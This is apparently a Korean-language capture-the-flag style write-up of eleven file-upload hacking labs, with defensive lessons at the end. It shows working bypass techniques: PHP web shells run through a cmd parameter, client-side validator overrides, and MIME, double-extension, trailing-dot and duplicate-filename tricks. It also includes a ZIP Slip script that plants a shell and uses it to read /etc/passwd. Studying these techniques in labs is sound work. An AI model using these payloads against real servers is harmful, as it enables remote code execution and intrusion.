---
title: "웹보안 및 모의해킹 Lab - File Upload Labs Writeup"
date: 2026-03-27T18:00:00+09:00
categories:
  - Web Hacking
tags:
  - Web Security Lab
  - File Upload
  - MIME Type Bypass
  - ZIP Slip
  - Path Traversal
last_modified_at: 2026-03-27T18:00:00+09:00
published: true
---
## 개요

파일 업로드 랩은 파일명, 확장자, MIME, 저장 경로, 압축 해제 경로를 어떻게 검증하는지 확인하는 실습임

핵심 축은 다음과 같음

- 응답 헤더 기반 정보 수집
- 업로드 경로 추적
- 클라이언트 검증 우회
- 확장자와 MIME 검증 우회
- 파서 불일치와 ZIP Slip

## LAB1 Server Fingerprinting

### 핵심

응답 헤더의 `Server` 값 확인이 핵심

### 풀이

외부 링크 요청을 Burp `HTTP history` 로 확인

응답 헤더에서 `Server` 값을 추출

### 제출값

```text
gunicorn/20.0.4
```

## LAB2 Basic File Upload

### 핵심

확장자 검증이 없으면 웹쉘 업로드가 바로 가능함

### 풀이

`admin.php` 형태의 웹쉘을 그대로 업로드

업로드된 파일에 `?cmd=whoami` 를 붙여 실행

### 제출값

```text
www-data
```

## LAB3 Upload Path Discovery

### 핵심

업로드 성공 후 접근 경로를 찾는 단계가 핵심

### 풀이

웹쉘 업로드 후 Burp 응답과 페이지 소스를 확인

```text
http://192.168.0.21:8080/vuln/file/uploads/temp/admin.php
```

다음 단계: `?cmd=pwd` 로 실제 저장 경로 확인

### 제출값

```text
/var/www/html/vuln/file/uploads/temp
```

## LAB4 Client-Side Validation Bypass

### 핵심

확장자 검증이 브라우저 JavaScript 에만 존재함

서버 측 검증이 없으면 요청 변조만으로 우회 가능함

### 문제 코드

```javascript
const ALLOWED_EXTENSIONS = ['jpg', 'jpeg', 'png', 'gif', 'webp']

function isAllowedFile(filename) {
    return ALLOWED_EXTENSIONS.includes(getExtension(filename))
}
```

### 풀이

정상 이미지처럼 `jpg` 파일을 선택한 뒤 Burp 에서 파일명을 `admin.php` 로 변경

업로드 후 아래 경로에서 웹쉘 실행

```text
/var/www/html/vuln/file/uploads/profiles/admin.php
```

`cat /etc/group` 결과에서 `root` 항목 확인

### 제출값

```text
root:x:0:
```

## LAB5 JS Override Bypass

### 핵심

검증 함수가 전역 객체에 노출되면 콘솔에서 재정의 가능함

클라이언트 검증이 남아 있어도 동일하게 우회 가능함

### 문제 코드

```javascript
// 예: window.FileValidator.check = function() { return true; }
window.FileValidator = {
    ALLOWED: ['jpg', 'jpeg', 'png', 'gif', 'webp'],
    check: function(filename) {
        var ext = filename.split('.').pop().toLowerCase()
        return this.ALLOWED.indexOf(ext) !== -1
    }
}
```

### 풀이

브라우저 콘솔에서 아래처럼 검증 함수를 덮어씀

```javascript
window.FileValidator.check = function () { return true }
```

다음 단계: PHP 웹쉘 업로드 후 `cat /etc/os-release` 실행

### 제출값

```text
debian
```

## LAB6 Extension Blacklist Bypass

### 핵심

블랙리스트 방식은 대체 PHP 확장자를 놓치기 쉬움

특정 문자열 몇 개만 막는 방식으로는 서버 코드 실행을 막기 어려움

### 풀이

`phtml` 확장자를 사용해 우회

업로드된 웹쉘에서 `cat /etc/os-release` 실행

### 제출값

```text
debian
```

## LAB7 MIME Type Bypass

### 핵심

서버가 클라이언트가 보낸 `Content-Type` 헤더를 그대로 신뢰함

파일 내용과 파일명보다 요청 헤더를 믿으면 우회 가능함

### 풀이

이미지 업로드 흐름으로 요청을 만든 뒤 Burp 에서 파일명을 `admin.php` 로 수정

`Content-Type` 은 이미지 계열로 유지한 상태에서 업로드 진행

업로드된 웹쉘에 `uname -r` 실행

### 제출값

```text
6.11.2-amd64
```

## LAB8 Double Extension Bypass

### 핵심

허용 확장자가 파일명 끝에 있는지 확인하지 않고 포함 여부만 검사함

따라서 `admin.jpg.php` 같은 이중 확장자 파일이 통과 가능함

### 풀이

```text
admin.jpg.php
```

업로드 후 웹쉘에서 `pwd` 와 `printenv` 를 실행

```text
http://192.168.0.21:8080/vuln/file/uploads/lab8/admin.jpg.php
```

환경변수 출력에서 `APACHE_LOG_DIR` 확인

### 제출값

```text
/var/log/apache2
```

## LAB9 Parser Mismatch

### 핵심

소스 설명상 검증기는 첫 번째 `filename` 을 보고

실제 저장은 PHP 가 해석한 마지막 `filename` 을 사용함

이처럼 파서 기준이 다르면 동일 요청이 서로 다른 파일명으로 해석됨

### 풀이

```http
Content-Disposition: form-data; name="upload_file"; filename="admin.jpg"; filename="admin.php"
Content-Type: application/octet-stream
```

검증 로직은 첫 번째 `admin.jpg` 를 보고 통과하고

실제 저장 흐름: 마지막 `admin.php` 처리

### 제출값

```text
33(www-data)
```

## LAB10 Trailing Dot Bypass

### 핵심

파일명을 `.` 기준으로 나눈 뒤 마지막 토큰만 검사하면 후행 점 우회가 가능함

`admin.php.` 처럼 보내면 검증 시 확장자가 비어 있는 것처럼 보이고 저장 시 정규화될 수 있음

### 풀이

Burp 에서 파일명을 아래처럼 변경해 업로드

```text
admin.php.
```

업로드 후 실제 접근 경로는 아래처럼 정리됨

```text
http://192.168.0.21:8080/vuln/file/uploads/lab10/admin.php
```

다음 단계: `cat /etc/passwd` 실행 후 현재 웹 서버 사용자 항목 확인

### 제출값

```text
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

## LAB11 ZIP Slip

### 핵심

압축 해제 시 entry 경로를 검증하지 않으면 업로드 기능이 임의 파일 쓰기로 확장됨

경로 순회 entry 로 웹 루트 하위에 바로 웹쉘을 배치할 수 있음

### 문제 코드

```python
import zipfile

with zipfile.ZipFile('evil.zip', 'w') as z:
    z.writestr('../../uploads/shell.php', '<?php system($_GET["cmd"]); ?>')
```

### 풀이

`../../uploads/shell.php` entry 를 가진 ZIP 생성 후 업로드

압축 해제 결과 웹 접근 가능한 `uploads` 경로 아래에 웹쉘이 배치됨

다음 단계: `cat /etc/os-release` 실행

### 제출값

```text
debian
```

## 정리

이번 FILE 랩은 다음 흐름으로 정리 가능함

- LAB1 은 응답 헤더 기반 정보 수집
- LAB2 와 LAB3 은 무검증 업로드와 저장 경로 확인
- LAB4 와 LAB5 는 클라이언트 검증 우회
- LAB6 부터 LAB10 까지는 서버 측 확장자 처리 약점 우회
- LAB11 은 압축 해제 경로 검증 부재를 이용한 임의 파일 쓰기

공통 결론도 단순함

- 클라이언트 검증만으로는 업로드 통제가 되지 않음
- `Content-Type`, `filename`, 후행 점, 이중 확장자는 모두 우회 지점이 될 수 있음
- 업로드 경로가 노출되면 코드 실행까지 연결되기 쉬움
- ZIP 해제 경로까지 포함해 서버 측 저장 로직 전체를 검증해야 함
